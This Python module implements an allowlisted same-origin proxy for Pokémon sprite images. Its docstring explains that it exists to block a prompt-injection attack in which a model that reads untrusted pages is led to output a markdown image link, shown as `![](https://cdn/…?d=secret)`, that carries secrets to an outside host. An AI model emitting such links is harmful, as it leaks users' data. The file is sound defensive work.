"""Same-origin sprite proxy, for deployments that cannot carry 754 MB of PNGs.

Why a proxy rather than just pointing `<img src>` at the CDN: the answer text is
model-authored and the model reads untrusted web pages, so the CSP is pinned at
`img-src 'self'`. Adding a CDN host to that list would re-open the
markdown-image exfiltration path — an injected `![](https://cdn/…?d=secret)`
would become loadable again. Serving the bytes from our own origin keeps the CSP
exactly as strict as it is with local files.

The path is matched against a strict allowlist before any request leaves the
process, so this cannot be turned into an open forward proxy: only
`pokemon/other/{official-artwork,home}[/shiny]/<digits>.png` and
`items/<safe-ident>.png` are reachable, and the upstream host is hard-coded.
"""
from __future__ import annotations

import asyncio
import os
import re
from pathlib import Path

import httpx

import observability as obs

UPSTREAM = "https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites"

# Nothing outside these two shapes is ever fetched.
ALLOWED = re.compile(
    r"^(?:pokemon/other/(?:official-artwork|home)/(?:shiny/)?\d{1,6}\.png"
    r"|items/[a-z0-9-]{1,64}\.png)$"
)

CACHE_DIR = Path(os.environ.get("SPRITE_CACHE_DIR", "/tmp/pokedex-sprites"))
MAX_BYTES = 3 * 1024 * 1024          # a sprite is ~50-400 KB; anything larger is wrong
_locks: dict[str, asyncio.Lock] = {}


def is_allowed(rel: str) -> bool:
    return bool(ALLOWED.match(rel))


def cached_path(rel: str) -> Path:
    return CACHE_DIR / rel


async def fetch(rel: str, client: httpx.AsyncClient) -> bytes | None:
    """Return the sprite bytes, from the local cache when possible.

    Caching is best-effort: on a read-only or ephemeral filesystem the write
    simply fails and every request goes upstream, which still works.
    """
    if not is_allowed(rel):
        return None

    path = cached_path(rel)
    try:
        if path.is_file():
            return path.read_bytes()
    except OSError:
        pass

    # one in-flight fetch per sprite, so a burst of identical requests does not
    # become a burst of upstream requests
    lock = _locks.setdefault(rel, asyncio.Lock())
    async with lock:
        try:
            if path.is_file():
                return path.read_bytes()
        except OSError:
            pass
        try:
            r = await client.get(f"{UPSTREAM}/{rel}", timeout=20, follow_redirects=True)
        except httpx.HTTPError as e:
            obs.warn("sprite.upstream_error", rel=rel, err=type(e).__name__)
            return None
        if r.status_code != 200:
            return None
        data = r.content
        if len(data) > MAX_BYTES or not data.startswith(b"\x89PNG"):
            obs.warn("sprite.rejected", rel=rel, bytes=len(data))
            return None
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            tmp = path.with_suffix(".part")
            tmp.write_bytes(data)
            tmp.replace(path)          # atomic: never serve a half-written file
        except OSError:
            pass                       # cache is optional
        return data
